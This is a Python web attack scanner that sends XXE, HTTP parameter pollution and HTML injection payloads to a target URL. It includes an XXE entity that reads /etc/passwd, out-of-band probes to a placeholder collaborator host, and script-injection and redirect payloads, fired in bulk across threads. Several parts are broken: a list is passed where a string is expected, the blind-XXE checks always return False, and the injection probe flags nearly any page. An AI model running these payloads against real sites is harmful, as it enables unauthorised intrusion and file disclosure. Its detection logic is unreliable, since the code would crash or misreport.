import requests
import random
import re
from bs4 import BeautifulSoup
from urllib.parse import urlparse, parse_qs, quote, unquote
from tqdm import tqdm
from concurrent.futures import ThreadPoolExecutor, as_completed
import time
from tabulate import tabulate
from collections import defaultdict
import argparse
import signal

banner = r"""
    _ __ _____ _   __ __   __
  /// //_  _// \,' // /  / /
 / ` /  / / / \,' // /_ / /
/_n_/  /_/ /_/ /_//___//_/

"""
print(banner)

MAX_PAYLOADS = 2000
TIME_LIMIT = 60
HEADERS = {"User-Agent": "Mozilla/5.0"}
COLLABORATOR_URL = "your-collaborator-url.com"

exit_now = False


# ---------------------------------------------------
#                  Helper Functions
# ---------------------------------------------------
def random_string(length=10):
    """Generates a random alphanumeric string."""
    return "".join(
        random.choice("abcdefghijklmnopqrstuvwxyz0123456789") for _ in range(length)
    )


def extract_params(url):
    """Extracts parameters from a URL."""
    parsed_url = urlparse(url)
    return parse_qs(parsed_url.query)


def check_stability(url):
    """Checks if the target URL is reachable.

    This function now checks for common HTTP status codes that
    indicate the server is responding, not just 200 OK.
    """
    try:
        response = requests.head(url, timeout=5)  # Use HEAD request to avoid fetching large content
        if response.status_code in [200, 400, 404, 405, 500]:  # Common status codes
            return True
        else:
            print(f"Unusual status code: {response.status_code} for {url}")
            return False
    except requests.RequestException:
        print(f"Error connecting to {url}. Target seems unstable.")
        return False


# ---------------------------------------------------
#                XXE (XML External Entity) Testing
# ---------------------------------------------------
def test_initial_xxe_payload(url, headers, params):
    """Sends an initial probe to check for XXE reflections."""
    initial_payload = random_string()
    # Craft a probe using a parameter entity for potential out-of-band detection
    probe_string = f"""
    <!DOCTYPE foo [
        <!ENTITY % xxe SYSTEM "http://{COLLABORATOR_URL}/{initial_payload}">
        %xxe;
    ]>
    <foo></foo>
    """

    for param_name in params:
        if exit_now:
            break

        try:
            response = requests.post(
                url, headers=headers, data={param_name: probe_string}, timeout=10
            )  # Increased timeout for potential delays
            # Check for DNS interaction, error messages, or out-of-band interactions
            if is_xxe_vulnerable(response, initial_payload):
                print(
                    f"Potential XXE vulnerability found in parameter: {param_name}"
                )
                return param_name, response
        except requests.RequestException as e:
            print(f"Error during XXE initial probe: {e}")
    return None, None


def is_xxe_vulnerable(response, payload):
    """Checks for common signs of XXE vulnerability."""
    # 1. Check for error messages that might indicate XXE processing
    error_messages = [
        "XML Parsing Error",
        "Entity resolution",
        "DTD processing",
        "access external entity",
        "entity declaration",
    ]
    for message in error_messages:
        if message in response.text:
            return True

    # 2. Check for out-of-band interaction with the collaborator server
    if check_collaborator_interaction(payload):
        return True

    return False


def check_collaborator_interaction(payload):
    """Checks if the collaborator server received a request with the payload.

    TODO: Replace this with your actual logic for checking collaborator
          server interactions (e.g., check logs, database, etc.).
    """
    # Placeholder - you need to implement this based on your collaborator server setup
    return False


def analyze_xxe_context(response, payload):
    """Analyzes the response to determine XXE context."""
    soup = BeautifulSoup(response.text, "html.parser")
    injection_points = []

    # Check if the response contains a form with file upload
    if soup.find("input", type="file"):
        injection_points.append("file_upload")

    # Check if the response content type is XML
    if "xml" in response.headers.get("Content-Type", "").lower():
        injection_points.append("xml_data")

    context = {"injection_points": injection_points}
    return context


def generate_xxe_payload(context):
    """Generates an XXE payload based on context."""
    payloads = []

    for injection_point in context["injection_points"]:
        if injection_point == "file_upload":
            # Generate a payload that can be uploaded as a file
            payloads.append(
                """<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
               <foo>&xxe;</foo>"""
            )
        elif injection_point == "xml_data":
            # Generate a payload that can be injected directly into XML data
            payloads.append(
                """<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://your-collaborator-url.com/"> ]>
               <foo>&xxe;</foo>"""
            )
        # Add more injection points and payload generation logic here

    return payloads  # Return a list of payloads


def fuzz_xxe_payload(payload):
    """Applies fuzzing techniques to an XXE payload."""
    if payload is None:
        return []

    fuzzed_payloads = [
        payload,
        payload.replace("SYSTEM", "system"),  # Case variation
        payload.replace('"', "'"),  # Quote variation
        payload.replace("http", "https"),  # Protocol variation
    ]
    return fuzzed_payloads


def test_xxe_payload(url, headers, param_name, payload):
    """Tests an XXE payload for injection."""
    try:
        response = requests.post(
            url, headers=headers, data={param_name: payload}, timeout=5
        )
        is_successful = check_blind_xxe_success(response)
        return payload, response.status_code, response.url, is_successful
    except requests.RequestException:
        return payload, None, None, False


def check_blind_xxe_success(response):
    """Checks for successful Blind XXE exploitation.

    TODO: Implement logic to check for interactions with your
          external server (e.g., check server logs).
    """
    return False


# ---------------------------------------------------
#                HTTP Parameter Pollution
# ---------------------------------------------------


def test_hpp(url, headers, params):
    """Tests for HTTP Parameter Pollution (HPP) vulnerabilities."""
    hpp_results = []

    for param_name in params:
        if exit_now:  # Check for exit flag
            break

        original_value = params[param_name][0]

        # 1. Test Duplicate Parameters (Basic Case)
        polluted_params = {**params, param_name: [original_value, random_string()]}
        try:
            response = requests.get(
                url, headers=headers, params=polluted_params, timeout=5
            )
            if check_reflection(response, polluted_params[param_name]):
                hpp_results.append(
                    [param_name, "Duplicate Parameter", response.url]
                )
        except requests.RequestException as e:
            print(f"Error during HPP test (Duplicate Parameter): {e}")

        # 2. Test Multiple Parameters with Different Behaviors
        for num_params in range(
            2, 5
        ):  # Test with 2, 3, and 4 instances of the parameter
            multiple_params = defaultdict(list)
            for i in range(num_params):
                multiple_params[param_name].append(
                    random_string() if i > 0 else original_value
                )

            try:
                response = requests.get(
                    url, headers=headers, params=multiple_params, timeout=5
                )
                # --- Check for different server behaviors ---
                if all(
                    value in response.text for value in multiple_params[param_name]
                ):
                    hpp_results.append(
                        [
                            param_name,
                            f"Multiple Parameters ({num_params} - All Values)",
                            response.url,
                        ]
                    )
                elif multiple_params[param_name][0] in response.text:  # First value
                    hpp_results.append(
                        [
                            param_name,
                            f"Multiple Parameters ({num_params} - First Value)",
                            response.url,
                        ]
                    )
                elif multiple_params[param_name][-1] in response.text:  # Last value
                    hpp_results.append(
                        [
                            param_name,
                            f"Multiple Parameters ({num_params} - Last Value)",
                            response.url,
                        ]
                    )
            except requests.RequestException as e:
                print(f"Error during HPP test (Multiple Parameters): {e}")

    return hpp_results


def check_reflection(response, values):
    """Checks how the server reflects multiple parameter values."""
    if all(v in response.text for v in values):
        return "All Values Reflected"
    elif values[0] in response.text:
        return "First Value Reflected"
    elif values[-1] in response.text:
        return "Last Value Reflected"
    else:
        return None


# ---------------------------------------------------
#              Initial Probe & Analysis (HTMLi)
# ---------------------------------------------------
def test_initial_payload(url, headers, params):
    """Sends an initial probe to check for HTMLi reflections."""
    initial_payload = random_string()
    probe_string = f"<!-- {initial_payload} -->"

    for param_name in params:
        if exit_now:  # Check for exit flag
            break

        try:
            response = requests.get(
                url, headers=headers, params={param_name: probe_string}, timeout=5
            )
            if any(part in response.text for part in initial_payload):
                print(
                    f"Potential HTML injection vulnerability found in parameter: {param_name}"
                )
                return param_name, response
        except requests.RequestException as e:
            print(f"Error during HTMLi initial probe: {e}")
    return None, None


def analyze_response(response, payload):
    """Analyzes the response to determine if the payload was reflected."""
    return payload in response.text


def analyze_context(response, payload):
    """Analyzes the response to determine payload context."""
    soup = BeautifulSoup(response.text, "html.parser")
    context = {
        "in_attribute": False,
        "in_tag": False,
        "tag": None,
        "attribute": None,
    }

    for tag in soup.find_all(True):
        for attr_name, attr_value in tag.attrs.items():
            if payload in attr_value:
                context["in_attribute"] = True
                context["tag"] = tag.name
                context["attribute"] = attr_name
                return context

        if payload in tag.text:
            context["in_tag"] = True
            context["tag"] = tag.name
            return context
    return context


# ---------------------------------------------------
#                  Payload Generation (HTMLi)
# ---------------------------------------------------
def generate_payload(context):
    """Generates an HTMLi payload based on context."""
    redirect_url = (
        "https://www.example.com"  # Replace with the desired redirect URL
    )

    if context["in_attribute"]:
        return (
            f'{context["attribute"]}="{random_string()}"'  # Inject in the vulnerable attribute
        )
    elif context["in_tag"]:
        return f"<meta http-equiv='refresh' content='0; url={redirect_url}'>"  # Meta refresh injection
    else:
        return f"<img src='x' onerror=alert('{random_string(5)}')>"


def fuzz_payload(payload):
    """Applies fuzzing techniques to a payload."""
    if payload is None:
        return []

    fuzzed_payloads = [
        payload.upper(),
        payload.lower(),
        quote(payload),
        unquote(payload),
        payload.replace("<", "< "),
        payload.replace(">", " >"),
    ]
    return fuzzed_payloads


# ---------------------------------------------------
#                  Payload Testing (HTMLi)
# ---------------------------------------------------
def test_payload(url, headers, param_name, payload):
    """Tests a payload for HTML injection."""
    try:
        response = requests.get(
            url, headers=headers, params={param_name: payload}, timeout=5
        )
        return (
            payload,
            response.status_code,
            response.url,
            analyze_response(response, payload),
        )
    except requests.RequestException:
        return payload, None, None, False


# ---------------------------------------------------
#           Signal Handler for Ctrl+C
# ---------------------------------------------------
def signal_handler(sig, frame):
    """Handles Ctrl+C signal."""
    global exit_now
    print("\nCtrl+C detected! Exiting...")
    exit_now = True


# ---------------------------------------------------
#                Main Execution
# ---------------------------------------------------
def main():
    global exit_now

    # --- Argument Parsing ---
    parser = argparse.ArgumentParser(
        description="Web Vulnerability Scanner (HPP, HTMLi & XXE)"
    )
    parser.add_argument("-u", "--url", required=True, help="Target website URL")
    parser.add_argument(
        "--hpp", action="store_true", help="Test for HTTP Parameter Pollution"
    )
    parser.add_argument(
        "--htmli", action="store_true", help="Test for HTML Injection"
    )
    parser.add_argument(
        "--xxe", action="store_true", help="Test for XXE (XML External Entity)"
    )
    args = parser.parse_args()

    target_url = args.url

    if not check_stability(target_url):
        return  # Exit if the target is unstable

    params = extract_params(target_url)

    # --- Set up Ctrl+C signal handler ---
    signal.signal(signal.SIGINT, signal_handler)

    # --- XXE Testing ---
    if args.xxe:
        vuln_param, initial_response = test_initial_xxe_payload(
            target_url, HEADERS, params
        )

        if vuln_param:
            context = analyze_xxe_context(initial_response, initial_response.text)
            print(f"\nContext: {context}\n")

            print("Generating and testing XXE payloads...")
            payloads = [generate_xxe_payload(context) for _ in range(MAX_PAYLOADS)]
            payloads = [
                fuzzed for payload in payloads for fuzzed in fuzz_xxe_payload(payload)
            ]
            payloads = payloads[:MAX_PAYLOADS]

            results = []
            with ThreadPoolExecutor(max_workers=30) as executor:
                futures = [
                    executor.submit(
                        test_xxe_payload,
                        target_url,
                        HEADERS,
                        vuln_param,
                        payload,
                    )
                    for payload in payloads
                ]
                for _ in tqdm(
                    as_completed(futures),
                    total=len(payloads),
                    desc="Testing Payloads (XXE)",
                    unit="payload",
                ):
                    if exit_now:
                        print("Stopping payload testing due to Ctrl+C.")
                        executor.shutdown(wait=False)  # Stop immediately
                        break

                for future in futures:
                    if future.done():
                        results.append(future.result())

            successful_payloads = [(p, c, u, a) for p, c, u, a in results if a]

            if successful_payloads:
                print("\nSuccessful XXE Payloads:")
                print(
                    tabulate(
                        successful_payloads,
                        headers=[
                            "Payload",
                            "Response Code",
                            "URL",
                            "Successful",
                        ],
                        tablefmt="grid",
                    )
                )
            else:
                print("No successful XXE payloads found.")
        else:
            print("No potential XXE vulnerabilities detected.")

    # --- HTTP Parameter Pollution Testing ---
    if args.hpp:
        hpp_results = test_hpp(target_url, HEADERS, params)
        if hpp_results:
            print("\nPotential HTTP Parameter Pollution Vulnerabilities:")
            print(
                tabulate(
                    hpp_results,
                    headers=["Parameter", "Type", "URL"],
                    tablefmt="grid",
                )
            )
            continue_testing = (
                input("\nContinue to HTML injection testing? (y/N): ")
                .strip()
                .lower()
            )
            if continue_testing != "y":
                print("Stopping execution.")
                return
        else:
            print("\nNo HTTP Parameter Pollution vulnerabilities found.\n")

    # --- HTML Injection Testing ---
    if args.htmli:
        vulnerable_param, initial_response = test_initial_payload(
            target_url, HEADERS, params
        )

        if vulnerable_param:
            context = analyze_context(
                initial_response,
                initial_response.url.split(f"{vulnerable_param}=")[1].split(
                    "&"
                )[0],
            )
            print(f"\nContext: {context}\n")

            print("Generating and testing HTML injection payloads...")
            payloads = [generate_payload(context) for _ in range(MAX_PAYLOADS)]
            fuzzed_payloads = [
                fuzzed for payload in payloads for fuzzed in fuzz_payload(payload)
            ]
            payloads = fuzzed_payloads[:MAX_PAYLOADS]

            results = []
            with ThreadPoolExecutor(max_workers=30) as executor:
                futures = [
                    executor.submit(
                        test_payload,
                        target_url,
                        HEADERS,
                        vulnerable_param,
                        payload,
                    )
                    for payload in payloads
                ]
                for _ in tqdm(
                    as_completed(futures),
                    total=len(payloads),
                    desc="Testing Payloads",
                    unit="payload",
                ):
                    if exit_now:
                        print("Stopping payload testing due to Ctrl+C.")
                        executor.shutdown(wait=False)  # Stop immediately
                        break

                for future in futures:
                    if future.done():
                        results.append(future.result())

            successful_payloads = [(p, c, u, a) for p, c, u, a in results if a]

            if successful_payloads:
                print("\nSuccessful HTML Injection Payloads:")
                print(
                    tabulate(
                        successful_payloads,
                        headers=[
                            "Payload",
                            "Response Code",
                            "URL",
                            "Successful",
                        ],
                        tablefmt="grid",
                    )
                )
            else:
                print("No successful HTML injection payloads found.")
        else:
            print("No potential HTML injection vulnerabilities detected.")


if __name__ == "__main__":
    main()